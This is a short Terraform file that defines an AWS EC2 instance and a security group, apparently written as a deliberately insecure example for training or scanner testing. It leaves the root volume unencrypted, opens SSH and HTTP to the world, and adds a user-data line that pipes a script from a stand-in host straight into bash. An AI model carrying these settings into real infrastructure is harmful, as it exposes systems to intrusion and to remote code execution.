provider "aws" {
  region = "us-east-1"
}

resource "aws_instance" "insecure_ec2" {
  ami           = "ami-0c94855ba95c71c99" # Public Amazon Linux AMI
  instance_type = "t2.micro"

  tags = {
    Name = "InsecureEC2"
  }

  # Missing encryption
  root_block_device {
    volume_size = 8
    volume_type = "gp2"
    encrypted   = false
  }

  # User data executes script from the internet
  user_data = <<-EOF
              #!/bin/bash
              curl http://insecure-source.com/install.sh | bash
              EOF
}

resource "aws_security_group" "allow_all" {
  name        = "allow_all"
  description = "Open security group"
  vpc_id      = "vpc-123456"

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"] # SSH open to the world
  }

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"] # HTTP open to the world
  }
}
